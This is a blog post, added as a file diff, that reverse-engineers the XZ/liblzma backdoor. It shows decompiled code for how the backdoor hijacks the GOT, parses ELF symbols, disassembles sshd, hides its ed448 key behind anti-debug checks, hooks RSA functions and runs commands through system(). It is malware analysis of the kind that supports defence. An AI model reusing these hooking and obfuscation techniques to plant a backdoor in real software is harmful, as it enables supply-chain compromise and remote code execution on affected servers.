@@ -1,0 +1,567 @@
+---
+layout: post
+title:  "Reverse engineering the XZ backdoor"
+date:   2024-04-23 14:48:00 -0400
+categories: malware
+excerpt: An in-depth look at the backdoor in XZ
+---
+
+## Overview
+
+Over the past few weeks, I've been analyzing the [xz backdoor](https://www.openwall.com/lists/oss-security/2024/03/29/4). The modifications to the build process that inject the backdoor have already been analyzed very thoroughly ([1](https://gynvael.coldwind.pl/?lang=en&id=782), [2](https://research.swtch.com/xz-script)), so this writeup will be entirely focused on the binary blob that gets included into liblzma at the end. This writeup mainly focuses on the process by which the hook function is inserted into sshd, as opposed to the actual code execution capabilities of the hook. The hook function itself may be the subject of a future blog post.
+
+Note: Any decompiler output that I show in this writeup is from my compiled version of `liblzma.so.5.6.1`, but the 5.6.0 version looks mostly identical. Since the 5.6.0 version has symbols, I'll be using those symbol names to refer to the functions I discuss here.
+
+## Initial Steps
+
+The entry point of the backdoor code is `crc64_resolve`, which calls `_get_cpuid`. `get_cpuid` is obfuscated to look like an ordinary functino to collect CPU information: it calls `_cpuid`, which is a legitimate function to execute the CPUID instruction.
+
+However, `_get_cpuid` makes an obfuscated call to the entry point of the malicious code at `.Llzma_delta_props_encoder`. This is accomplished by finding the location where `_cpuid` is stored in the GOT, then overwriting the entry with the address of `.Llzma_delta_props_encoder`. It also appears that the GOT entry for `_cpuid` is restored after the backdoor code finishes executing in order to avoid raising suspicion.
+
+```c
+00004d4d          int64_t real_cpuid = *cpuid_addr
+00004d54          // overwrite _cpuid ptr in GOT with .Llzma_delta_props_encoder
+00004d54          *cpuid_addr = got_baseaddr - 0x1a918
+00004d57          int32_t* r8
+00004d57          got_baseaddr = _cpuid(arg1, arg2, cpuid_addr, &data_2f200, r8)
+00004d62          *cpuid_addr = real_cpuid
+```
+
+## Setup and Symbol Parsing
+
+### ELF Loading
+
+The backdoor uses many functions from shared libraries including libc and libcrypto, as well as functions from the `sshd` binary itself. In order to determine the locations of these functions, the backdoor must find the locations of each of the required ELF files in memory and parse certain segments. The entry point of this parsing is `.Lget_literal_price.part.0`, which takes a pointer to an ELF executable as its first argument and saves certain fields to a struct (`struct elf_data`) that gets passed in as the second argument.
+
+The `elf_data` struct is defined in the following way:
+
+```c
+struct elf_data __packed
+{
+    int64_t baseaddr; // pointer to the start of the ELF file in memory
+    int64_t phdr_p_vaddr;
+    struct Elf64_Phdr* phdr_table;
+    int16_t hdr_count;
+    __padding char _1a[6];
+    struct Elf64_Phdr* phdr_dynamic_addr; // location of the first header with p_type PT_DYNAMIC
+    uint32_t dyn_count; // total number of Elf64_Dyn structures in dynamic section
+    __padding char _2c[4];
+    char* strtab; // pointer to string table
+    struct Elf64_Sym* symtab; // pointer to symbol table
+    void* relocs_jmprel; // value read from Elf64_Dyn with tag DT_JMPREL
+    uint32_t rel_count; // calculated from Elf64_Dyn with tag DT_PLTRELSZ
+    int32_t gnu_relro_flag; // whether a segment of type PT_GNU_RELRO is present
+    void* gnu_relro_vaddr; // address of PT_GNU_RELRO segment, if it exists
+    int64_t gnu_relro_p_memsz; // size of PT_GNU_RELRO, if it exists
+    int16_t* dt_verdef; // address of version definition table
+    int64_t dt_verdefnum; // number of entries in version definition table
+    Elf64_Versym* dt_versym; // address of .gnu.version (DT_VERSYM)
+    void* dt_rela; // pointer to relocation table, read from Elf64_Dyn with DT_RELA tag
+    uint32_t rela_count; // number of relocations
+    __padding char _84[4];
+    void* dt_tag_24; // location of Elf64_Dyn with d_tag = 24, couldnt find what that represents
+    void* dt_tag_23; // Elf64_Dyn with d_tag = 23
+    void* seg_x_start; // PT_LOAD segment with flags PF_X
+    int64_t seg_x_size;
+    void* seg_r_addr; // PT_LOAD segment with flags PF_R
+    int64_t seg_r_size;
+    uint64_t field_b8;
+    int64_t field_c0;
+    int64_t field_c8;
+    char flags;
+    __padding char _d1[7];
+    int32_t gnu_hash_nbucket; // values from DT_GNU_HASH struct
+    int32_t gnu_hash_bucket;
+    uint32_t gnu_hash_bloom_shift;
+    __padding char _e4[4];
+    void* gnu_hash_bloom;
+    int32_t* gnu_hash_buckets;
+    int64_t* gnu_hash_chain;
+};
+```
+
+#### String Table and Symbol Table
+
+The function `.Lcrc_init.0` looks up a symbol by name in a given ELF executable. As an added layer of obfuscation, the name of the string to look up is passed in as an index in a prefix trie, as described [here](https://social.hackerspace.pl/@q3k/112184695043115759).
+
+The function enumerates symbols by iterating through the [DT_GNU_HASH](https://flapenguin.me/elf-dt-gnu-hash) table:
+
+```c
+0000765c              for (int32_t i = 0; i u< elf->gnu_hash_nbucket; i = i + 1)
+00007670                  void* bucket = &elf->gnu_hash_buckets[zx.q(i)]
+00007683                  // original name: .Lparse_bcj.0
+00007683                  if (j_elf_lookup_addr(elf, addr: bucket, size: 4, flags: 4) == 0)
+00007683                      break
+00007698                  // get an individual hash from chain
+00007698                  void* hash_ptr = elf->gnu_hash_chain + (zx.q(*bucket) << 2)
+```
+
+For each hash retrieved from the table, the corresponding entry in the symbol table is located. The `st_name` field is used to look up the offset of the symbol in the string table, at which point the name is looked up in the prefix trie to see if it matches the desired symbol. If a match is found, the function returns.
+
+```c
+00007718                          int64_t sym_ptr = zx.q(sym->st_name) + elf->strtab
+00007736                          if (j_elf_lookup_addr(elf, addr: sym_ptr, size: 1, flags: 4) == 0)
+00007736                              break
+0000774c                          // original name: .Lsimple_coder_update.0
+0000774c                          if (lookup_trie(sym_ptr, nullptr) == sym_trie_idx)
+00007753                              if (version_trie_idx == 0)
+00007875                                  return sym
+```
+
+Optionally, `.Lcrc_init.0` can also check whether the version information of the executable contains a given string. As far as I can tell, the only version entry that is ever searched for in this way is the string `GLIBC_2.2.5`.
+
+```c
+0000775c                              Elf64_Versym* versym_ptr = &elf->dt_versym[sym_idx]
+00007777                              if (j_elf_lookup_addr(elf, addr: versym_ptr, size: 2, flags: 4) == 0)
+00007777                                  break
+0000777d                              int32_t rax_14
+0000777d                              rax_14.b = elf->flags
+00007783                              Elf64_Versym versym = *versym_ptr
+00007798                              if ((rax_14.b & 0x18) == 0x18 && (versym & 0x7ffe) != 0)
+000077a5                                  Elf64_Verdef* dt_verdef = elf->dt_verdef
+000077ae                                  int32_t j = 0
+000077ba                                  while (zx.q(j) u< elf->dt_verdefnum)
+000077d7                                      if (j_elf_lookup_addr(elf, addr: dt_verdef, size: 0x14, flags: 4) == 0)
+000077d7                                          break
+000077e3                                      if (dt_verdef->vd_version != 1)
+000077e3                                          break
+000077e9                                      int32_t rax_17
+000077e9                                      rax_17.w = versym & 0x7fff
+000077f3                                      if (rax_17.w == dt_verdef->vd_ndx)
+0000781b                                          Elf64_Verdaux* aux = zx.q(dt_verdef->vd_aux) + dt_verdef
+00007828                                          if (j_elf_lookup_addr(elf, addr: aux, size: 8, flags: 4) == 0)
+00007828                                              break
+00007831                                          int64_t vda_name = zx.q(aux->vda_name) + elf->strtab
+0000784f                                          if (j_elf_lookup_addr(elf, addr: vda_name, size: 1, flags: 4) == 0)
+0000784f                                              break
+00007863                                          if (version_trie_idx == lookup_trie(vda_name, nullptr))
+00007875                                              return sym
+```
+
+#### Relocations
+
+In order to obtain the correct addresses for the symbols it looks up, the backdoor also parses the relocation table to calculate the address of the symbol after relocation. The relocation table is found during the initial parsing of the `.dynamic` section of the executable: the DT_JMPREL tag corresponds to the relocations associated with the PLT, and the DT_RELA tag corresponds to other relocations.
+
+```c
+// .Llz_encode.1
+0000afa0  int64_t do_reloc(struct elf_data* elf_data, Elf64_Rela* rela, int32_t count, int64_t idx, 
+0000afa0      int32_t sym_name)
+
+0000afb7      Elf64_Rela* rela_1 = rela
+0000afd1      int32_t rax = check(code: nullptr, bit_idx: 0x67, num_bits: 5, flag_idx: 4)
+0000afd6      int64_t i = 0
+0000afda      if (rax != 0)
+0000aff5          while (i u< zx.q(count))
+0000afe0              uint64_t sym_idx = rela_1->r_info
+0000afe9              if (zx.q(sym_idx.d) == idx)
+0000b001                  struct Elf64_Sym* sym_addr = &elf_data->symtab[sym_idx u>> 0x20]
+0000b00a                  if (sym_addr->st_shndx == 0 && lookup_trie(zx.q(sym_addr->st_name) + elf_data->strtab, nullptr) == sym_name)
+0000b026                      break
+0000afeb              i = i + 1
+0000afee              rela_1 = &rela_1[1]
+0000aff5      int64_t reloc_addr
+0000aff5      if (rax == 0 || (rax != 0 && i u>= zx.q(count)))
+0000afdc          reloc_addr = 0
+0000aff5      if (rax != 0 && i u< zx.q(count))
+0000b02c          reloc_addr = rela_1->r_offset + elf_data->baseaddr
+0000b03c      return reloc_addr
+```
+
+### The x86_64 Disassembler
+
+As many people have already pointed out, the function `.Lx86_code.part.0` is an x86_64 disassembler. The first argument is a struct (`struct dasm`) that gets filled in with different fields of the instruction. I haven't determined what every field of it corresponds to, but here's the struct definition with the fields that I do have:
+
+```c
+struct dasm __packed
+{
+    void* addr;
+    uint64_t size;
+    __padding char _10[1];
+    __padding char _11[3];
+    char mandatory_prefix;
+    char segment;
+    char op_size_override;
+    char addr_size_override;
+    __padding char _18[1];
+    __padding char _19[1];
+    __padding char _1a[1];
+    char rex_prefix;
+    char modRM;
+    char modRM_mod;
+    char modRM_reg;
+    char modRM_rm;
+    __padding char _20[1];
+    __padding char _21[1];
+    __padding char _22[1];
+    __padding char _23[1];
+    __padding char _24[4];
+    uint32_t opcode;
+    __padding char _2c[4];
+    int64_t mem_operand;
+    int64_t imm_operand;
+    __padding char _40[8];
+    __padding char _48[8];
+    __padding char _50[1];
+};
+```
+
+The field that I've called `opcode` in this struct isn't the actual opcode of the instruction, but it's clearly related. In every example where I've seen it used, it's actually equal to the opcode + 0x80, but I haven't confirmed that that's always what it is.
+
+The disassembler is used to find locations of functions and structures in the `sshd` binary. Unlike the shared libraries, `sshd` doesn't export any function names, and it's usually not compiled with debug symbols. That means the backdoor needs a different way to determine where certain functions are. In addition, since `sshd` is compiled on many different version of many different Linux distributions, the backdoor can't rely on specific functions being at specific offsets in the compiled binary. The disassembler allows the backdoor to search for patterns of instructions that it expects to appear in every version of sshd. There are too many of these searches for me to explain all of them here, but here's one example to give you an idea of the level of complexity involved:
+
+The function `.Llzma_buf_cpy.0` is an example of one function that uses the disassembler to search for memory addresses. It first searches for a `call` instruction whose operand matches a given function. (The target function is passed as an argument to `.Llzma_buf_cpy.0`, but I only ever saw it called once to search for calls to `xcalloc` in the `main` function of `usr/sbin/sshd`.) Once it finds that `call` instruction, it checks for a `mov` immediately after.
+
+```c
+0000e793              if (code u< end && dasm_find_call_insn(code, end, target: xcalloc_ptr, dasm: dasm_ptr) != 0) // dasm_find_call_insn = .Llzma_optimum_normal.0
+0000e7cd                  code = dasm.size + dasm.addr
+0000e7d9                  // dasm_find_opcode_arg = .Llzma_properties_size.0, opcode target is 0x109 - 0x80 = 0x89 (mov)
+0000e7d9                  int32_t rax_3 = dasm_find_opcode_arg(code, end: &code[0x20], dasm: dasm_ptr, opcode: 0x109, target_operand: 0)
+```
+
+This particular `mov` instruction is opcode `0x89`, which means the destination of the `mov` is a memory address. The ModR/M field of the instruction is checked to see if RIP-relative addressing is used, and if it is, the function takes that into account and adds the correct value to the memory address.
+
+```c
+0000e856                              if ((modrm & 0xff00ff00) == 0x5000000)
+0000e85d                                  mem_operand = mem_operand + dasm.addr + dasm.size
+```
+
+Looking at `main`, we can see that there are several calls to `xcalloc` that fit this pattern, all of which look something like this:
+
+```
+e822860400         call    xcalloc
+4c89e7             mov     rdi, r12
+be04000000         mov     esi, 0x4
+4889c5             mov     rbp, rax
+488905a8310d00     mov     qword [rel data_e3ba8], rax
+```
+
+These calls appear to be allocating memory for global data structures, with the `mov` instruction storing the pointer to the new structure at a known address. The structures that get allocated during these calls are `sensitive_data`, `startup_pipes`, `startup_flags`, and `rexec_argv`.
+
+The function iterates through all of `main` looking for `mov` instructions that follow an `xcmalloc` call, saving each destination address of the `mov` to an array (`operands` in the code snippet below). It then appears to traverse the array looking for a set of three destination addresses that are adjacent to each other:
+
+```c
+0000e8b3              op1 = (&operands)[i]
+0000e8b7              int64_t j = 0
+0000e8ec              int64_t k
+0000e8ec              void* op2
+0000e8ec              do
+0000e8b9                  op2 = (&operands)[j]
+0000e8bd                  k = 0
+0000e8d3                  while (not(op1 == op2 - 8 && op2 == (&operands)[k] - 8))
+0000e8e0                      k = k + 1
+0000e8e5                      if (k.d u>= max)
+0000e8e5                          break
+```
+
+The search for three adjacent addresses allows the function to determine which of the `xcmalloc` calls correspond to the `sensitive_data` struct. `sensitive_data` is [defined](https://sources.debian.org/src/openssh/1%3A7.9p1-10%2Bdeb10u2/sshd.c/#L210) in the following way:
+
+```
+struct {
+	struct sshkey	**host_keys;		/* all private host keys */
+	struct sshkey	**host_pubkeys;		/* all public host keys */
+	struct sshkey	**host_certificates;	/* all public host certificates */
+	int		have_ssh2_key;
+} sensitive_data;
+
+```
+
+The `host_keys`, `host_pubkeys`, and `host_certificates` structures are allocated with three separate calls to `xcmalloc`, and pointers to the structures are stored in three adjacent fields of the `sensitive_data` struct.
+
+To recap, it appears that the entire purpose of the function `.Llzma_buf_cpy.0` is to find the `sensitive_data` struct, which it does by 1) disassembling until it finds a call to `xzmalloc`, 2) finding a `mov` instruction right after that call and storing the destination address, correctly accounting for relative addressing, and 3) determining which of those allocations correspond to contiguous fields of a struct.
+
+### Anti-Debug / Key Obfuscation
+
+There are three different functions that seem to be used as anti-debug checks called at the start of a function: `.Llzma2_decoder_end.1`, `.Llzma_index_iter_rewind.cold`, and `.Llzma_check_init.part.0`. All of these are wrappers around `.Lrc_read_init.part.0` (`check_internal`), which starts off the anti-debug checking process.
+
+```c
+00025687      void* code_1 = nullptr
+0002568c      struct global_ctx* global_ctx_1 = global_ctx
+00025693      if (global_ctx_1 == 0)
+00025693          goto done
+00025695      uint64_t flag_idx_1 = zx.q(flag_idx)
+000256a1      if (global_ctx_1->checked_before[flag_idx_1] != 0)
+000256a1          goto done
+000256a3      global_ctx_1->checked_before[flag_idx_1] = 1
+000256d1      // do_tamper_checks: .Llzma2_encoder_init.1
+000256d1      int32_t rax = do_tamper_checks(code, &code_1, nullptr, global_ctx_1->liblzma_start, global_ctx_1->liblzma_end, 1)
+000256d8      int32_t rax_2
+000256d8      int64_t rax_3
+000256d8      if (rax != 0)
+000256fd          // dasm_update_bit_arr: .Llzma_memlimit_get.1
+000256fd          rax_2 = dasm_update_bit_arr(code: code_1, global_ctx->liblzma_end, bit_idx, num_bits, zx.d(option == 0))
+00025704          if (rax_2 != 0)
+00025706              struct global_ctx* global_ctx_2 = global_ctx
+0002570a              global_ctx_2->bit_arr_count = global_ctx_2->bit_arr_count + num_bits
+00025710              done:
+00025710              rax_3 = 1
+00025704      if (rax == 0 || (rax != 0 && rax_2 == 0))
+000256da          rax_3 = 0
+0002571f      return rax_3
+```
+
+The primary method of checking for a debugger is to iterate through a region of code and check for the presence of an `endbr64` instruction. The function `.Llzma_block_buffer_encode.0` (`check_endbr64`) performs this check. The third argument passed to this function is always `0xe230`, so the condition that's checked here holds if `code == 0xfa1e0ff3`, the opcode for `endbr64`.
+
+```c
+0000d9f0  uint64_t check_endbr64(int64_t code, int64_t end, int32_t const_e230)
+
+0000d9f7      int32_t var_8 = 0x5e2
+0000da01      uint32_t rdx = 0
+0000da03      int32_t var_4 = 0xf223
+0000da0f      if (end - code s> 3)
+0000da18          int32_t var_8_1 = 0x5e20000
+0000da35          rdx = (0x5e20000 | const_e230) + *code == 0xf223 // (0xfa1e0ff3 + 0x5e2e230) & 0xffffffff = 0xf223
+0000da3a      return zx.q(rdx)
+```
+
+Interestingly, the function that calls `check_endbr64` also seems to have an option to perform a different check instead, but I never saw it used. Depending on a flag that's passed as an argument, instead of calling `check_endbr64`, it uses the disassembler to search for an instruction where `opcode == 0xf9f`. I'm not sure when this would've been called, or even what opcode `0xf9f` corresponds to, as the values that the disassembler uses to represent opcodes aren't equal to the real opcode values.
+```c
+0001f4be      if (option == 0)
+0001f4de          int32_t option_1 = option
+0001f4f2          struct dasm dasm
+0001f4f2          int64_t rcx
+0001f4f2          int64_t rdi
+0001f4f2          rdi, rcx = __memfill_u32(&dasm, option_1, 0x58)
+0001f50a          if (code_dasm(dasm: &dasm, code, end) != 0 && dasm.opcode == 0xf9f)
+0001f511              char* next = dasm.size + dasm.addr
+0001f518              if ((next.b & 0xf) == 0)
+0001f51d                  if (insn_out != 0)
+0001f526                      *insn_out = next
+0001f51f                  option_1 = 1
+0001f52c          option_2 = option_1
+0001f4be      else
+0001f4c5          option_2 = check_endbr64(code, end, offset: 0xe230)
+```
+
+If the `endbr64` instruction is successfully located, the function `.Llzma_lzma_encoder_init.0` (`update_bit_arr`) is called. This function makes some comparisons against the opcode produced in the disassembler output.  If the opcode is *not* one of the opcodes in a given list, then a single 1 bit is stored to a specific offset in a bit array of size 0x1c8 bits (0x39 bytes).
+
+```c
+00019e70  int64_t update_bit_arr(struct dasm* arg1, int32_t* bit_idx_ptr)
+
+00019e74      int32_t bit_idx = *bit_idx_ptr
+00019e7e      if (bit_idx u<= 0x1c7)
+00019e80          uint32_t opcode = arg1->opcode
+00019eb2          if (opcode != 0x109 && opcode != 0xbb && (opcode - 0x83 u> 0x2e || (opcode - 0x83 u<= 0x2e && ((0x410100000101 u>> (opcode - 0x83).b).b & 1) == 0)))
+00019ec0              uint64_t byte_idx = zx.q(bit_idx u>> 3)
+00019ec3              struct global_ctx* global_ctx_1 = global_ctx
+00019ecf              global_ctx_1->bit_arr[byte_idx] = global_ctx_1->bit_arr[byte_idx] | (1 << (bit_idx.b & 7)).b
+00019ed7          *bit_idx_ptr = bit_idx + 1
+00019ede      return 1
+```
+
+By storing different bits to different offsets, the anti-debug checks gradually build up the value of a chacha20-encrypted ed448 key, which is used later on in the backdoor. Therefore, if you naively patch the check functions to always return success, the key value will still be wrong and the backdoor will not function.
+
+## Hooking
+
+### Setting Up The Hooks
+
+The backdoor appears to set hooks for three functions: `RSA_public_decrypt`, `RSA_get0_key`, and `EVP_PKEY_set1_RSA`. However, all three hooks are wrappers around the function `.Llzma_index_stream_size.1`, which is responsible for the malicious behavior of the backdoor. After the malicious function has returned, the real function is called.
+
+```c
+00016670  void RSA_get0_key_hook(RSA* r, struct BIGNUM** n, struct BIGNUM** e, struct BIGNUM** d)
+
+00016680      struct global_ctx* global_ctx_1 = global_ctx
+0001668a      if (global_ctx_1 != 0)
+0001668c          struct crypto_table* crypto_table = global_ctx_1->crypto_table
+00016693          if (crypto_table != 0)
+00016695              void* real_RSA_get0_key = crypto_table->real_RSA_get0_key
+0001669c              if (real_RSA_get0_key != 0)
+000166a4                  if (r != 0)
+000166b0                      RSA* r_1 = r
+000166b4                      void done_before  // all_hooks: .Llzma_index_stream_size.1
+000166b4                      all_hooks(rsa: r, global_ctx: global_ctx_1, done_before: &done_before)
+000166d4                  jump(real_RSA_get0_key)
+```
+
+The mechanism by which the hooks are set is already explained in detail in [this writeup](https://securelist.com/xz-backdoor-story-part-1/112354/) by Kaspersky, so I'm not going to get too far into it. Essentially, there's a callback function called `symbind64` that gets called when a symbol is resolved. The backdoor overwrites this callback with a malicious version of `symbind64` that replaces `RSA_public_decrypt`, `RSA_get0_key`, and `EVP_PKEY_set1_RSA` with its own hook functions. It also saves the real addresses of the three hooked symbols so that they can be called later.
+
+```c
+0000b3b2          // //lookup_trie: .Lsimple_coder_update.0
+0000b3b2          int32_t trie_val = lookup_trie(sym_name, nullptr)
+0000b3b7          void* RSA_public_decrypt_got = crypto_syms->RSA_public_decrypt_got
+0000b3c5          if (trie_val == 0x1d0 && RSA_public_decrypt_got != 0)
+0000b3c7              int64_t real_RSA_public_decrypt = *RSA_public_decrypt_got
+0000b3d0              if (real_RSA_public_decrypt u> 0xffffff)
+0000b3d6                  crypto_syms->real_RSA_public_decrypt = real_RSA_public_decrypt
+0000b3da                  uint64_t RSA_public_decrypt_hook = main_ctx->field_110
+0000b3e2                  // RSA_public_decrypt overwrite
+0000b3e2                  *RSA_public_decrypt_got = RSA_public_decrypt_hook
+```
+
+### The Hook Function (`.Llzma_index_stream_size.1`)
+
+#### The ed448 Key
+
+Remember that array that all the anti-debug checks were storing bits to? If every check passes, the resulting bit array is the following:
+
+```
+0d bf cd 93 43 56 2e 97 a5 fa a4 18 27 2b f0 fa
+ee 05 6f 55 8d 99 63 dc 71 2e 3d 8d fc 43 c0 ae 
+fb fe 1a d1 f8 b8 d8 72 15 ce c6 be 1f da 8b d3 
+c4 d8 5b 51 58 85 8d 66 da
+```
+
+The function `.Lparse_lzma12.0` takes the bit array and decrypts it using ChaCha20. First, 48 null bytes are ChaCha20-encrypted using a key, nonce, and counter of all 0s. Then, the first 32 bytes of the result are used as a key, the next 4 bytes as a little-endian counter, and the remaining 12 bytes as a nonce to decrypt the bit array.
+
+```c
+000249be              // use a key and IV of all 0s to encrypt 0x30 bytes,
+000249be              // generating the next key and IV
+000249be              void chacha_iv
+000249be              rax_1 = chacha20(chacha_in: &var_b8, chacha_inl: 0x30, chacha_key: &var_b8, chacha_iv: &chacha_iv, chacha_out: &chacha_1_out, table: crypto_table)
+000249c5              if (rax_1 != 0)
+000249e9                  // use the generated key and IV to decrypt the array
+000249e9                  // of bits
+000249e9                  void chacha_iv_1
+000249e9                  int32_t rax_2
+000249e9                  rax_2.b = chacha20(chacha_in: &global_ctx->bit_arr, chacha_inl: 0x39, chacha_key: &chacha_1_out, chacha_iv: &chacha_iv_1, chacha_out: result, table: global_ctx->crypto_table) != 0
+```
+
+The end result of this decryption is the following key:
+
+```
+0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28 
+34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48 
+10 0c b0 6c 3a be 14 ee 09 28 a5 14 98 eb 16 89 
+d5 fd 21 25 25 c8 43 36 00
+```
+
+Once the ed448 key is decrypted successfully, the first 32 bytes are used for decryption of the payload. The first 16 bytes of the modulus of the RSA key are used as the IV (consisting of a 4-byte counter followed by a 12-byte nonce), and the remaining bytes are the ciphertext.
+
+```c
+00017562                      int128_t chacha_iv = rsa_bytes[0].o
+00017571                      void ed448_key
+00017571                      if (decrypt_ed448_key(result: &ed448_key, global_ctx) == 0) // decrypt_ed448_key: .Lparse_lzma12.0
+00017571                          goto field_18_1
+0001759b                      if (chacha20(chacha_in: &rsa_bytes[0x10], chacha_inl: rsa_key_size - 0x10, chacha_key: &ed448_key, chacha_iv: &chacha_iv, chacha_out: &rsa_bytes[0x10], table: global_ctx->crypto_table) == 0)
+0001759b                          goto field_18_1
+```
+
+#### Code Execution
+
+The methods used by the backdoor to perform code execution have already been pretty extensively documented. The writeup of this [proof of concept](https://github.com/amlweems/xzbot) explains the format of the payload in detail, and I highly recommend reading through it. Another proof of concept with additional functionality is available [here](https://github.com/blasty/JiaTansSSHAgent).
+
+The hook function unpacks three little-endian integers from the start of the RSA modulus and calculates the value `rsa_key[0:4] * rsa_key[4:8] + rsa_key[8:16]`. The resulting value is expected to be a value from 0 to 3, and it appears to specify a choice of multiple possible formats for the rest of the payload.
+
+```c
+000174d9                      uint32_t rsa_field1 = rsa_bytes[0].d
+000174e2                      if (rsa_field1 == 0)
+000174e2                          goto done_hook
+000174e8                      uint32_t rsa_field2 = rsa_bytes[4].d
+000174f1                      if (rsa_field2 == 0)
+000174f1                          goto done_hook
+000174fb                      int64_t choice = rsa_field1 * rsa_field2 + rsa_bytes[8].q
+00017507                      if (choice u> 3)
+00017507                          goto done_hook
+```
+
+The now-decrypted ed448 public key is used to check whether the payload has a valid signature, ensuring that only the creator of the backdoor is able to use it. The PoCs that have been produced so far use a patched version of the binary where the public key is replaced with a key they control, allowing them to sign the payloads with their own key instead.
+
+```c
+000150ed      EVP_PKEY* pkey = crypto_table->EVP_PKEY_new_raw_public_key(type: 0x440, e: nullptr, key: ecc_key, keylen: 0x39)
+000150f6      if (pkey == 0)
+000150f6          goto label_15163
+000150f8      EVP_MD_CTX* ctx = crypto_table->EVP_MD_CTX_new()
+00015101      if (ctx == 0)
+00015101          goto label_1515d
+00015117      uint64_t rax_8
+00015117      if (crypto_table->EVP_DigestVerifyInit(ctx, pctx: nullptr, type: nullptr, e: nullptr, pkey) == 1)
+0001512c          int32_t rax_7 = crypto_table->EVP_DigestVerify(ctx, sig: rsa_n, siglen: 0x72, tbs, tbslen: arg3 + 0x20)
+```
+
+The primary method of code execution looks to be the use of `system()` to execute a command that is included as another field of the RSA modulus payload. This occurs when the payload format is set to option 2, suggesting that options 0, 1, and 3 might be for something other than code execution through `system()`.
+
+```c
+00017ef4                                      void* command = payload_base + payload_offset
+00017efb                                      if (*command == 0)
+00017efb                                          goto exit
+00017f01                                      global_ctx->syscalls->system(command)
+```
+
+## Final Thoughts
+
+Overall, this was one of the most interesting reversing projects I've done in a while: the use of a disassembler to find functions in a binary is a lot more sophisticated than the techniques you typically see, as was the obfuscation of the initial ChaCha20 key. Unfortunately, I wasn't able to do much more than a very surface-level analysis of how the code execution works - someone with a little more knowledge of OpenSSH internals could find quite a bit more. I may come back to this at some point to see if I can find some of the things referenced in [this thread](https://threadreaderapp.com/thread/1776691497506623562.html).
+
+## References
+
+* https://www.openwall.com/lists/oss-security/2024/03/29/4
+
+* https://gynvael.coldwind.pl/?lang=en&id=782
+
+* https://research.swtch.com/xz-script
+
+* https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504
+
+* https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01
+
+* https://github.com/amlweems/xzbot
+
+* https://github.com/blasty/JiaTansSSHAgent
+
+* https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b
+
+* https://securelist.com/xz-backdoor-story-part-1/112354/
+
+* https://threadreaderapp.com/thread/1776691497506623562.html
+
+## Appendix: Function Tables
+
+The backdoor stores the library functions that it uses at offsets to the global structure `global_ctx` (a pointer to this struct is saved at `.Llzma12_coder.1`). I kept track of which function were which by defining a struct for each function table with the names of the functions being used. I've included them here in case it's useful for anyone else who's been analyzing this:
+
+```c
+struct crypto_table __packed // global_ctx+8
+{
+    void* real_RSA_public_decrypt;
+    void* real_EVP_PKEY_set1_RSA;
+    void* real_RSA_get0_key;
+    void* RSA_public_decrypt_got;
+    void* EVP_PKEY_set1_RSA_got;
+    void* RSA_get0_key_got;
+    void* DSA_get0_pqg;
+    void* DSA_get0_pub_key;
+    void* EC_POINT_point2oct;
+    void* EC_KEY_get0_public_key;
+    void* EC_KEY_get0_group;
+    void* EVP_sha256;
+    void* RSA_get0_key;
+    void* BN_num_bits;
+    void* EVP_PKEY_new_raw_public_key;
+    void* EVP_MD_CTX_new;
+    void* EVP_DigestVerifyInit;
+    void* EVP_DigestVerify;
+    void* EVP_MD_CTX_free;
+    void* EVP_PKEY_free;
+    void* EVP_CIPHER_CTX_new;
+    void* EVP_DecryptInit_ex;
+    void* EVP_DecryptUpdate;
+    void* EVP_DecryptFinal_ex;
+    void* EVP_CIPHER_CTX_free;
+    void* EVP_chacha20;
+    void* RSA_new;
+    void* BN_dup;
+    void* BN_bin2bn;
+    void* RSA_set0_key;
+    void* EVP_Digest;
+    void* RSA_sign;
+    void* BN_bn2bin;
+    void* RSA_free;
+    void* BN_free;
+    struct syscalls_table* syscalls;
+    int32_t count;
+};
+
+struct syscalls_table __packed // global_ctx+0x10
+{
+    int64_t count;
+    void* malloc_usable_size;
+    void* getuid;
+    void* _exit;
+    void* setresgid;
+    void* setresuid;
+    void* system;
+    void* write;
+    void* pselect;
+    void* read;
+    void* errno_location;
+    void* setlogmask;
+    void* shutdown;
+};
+```
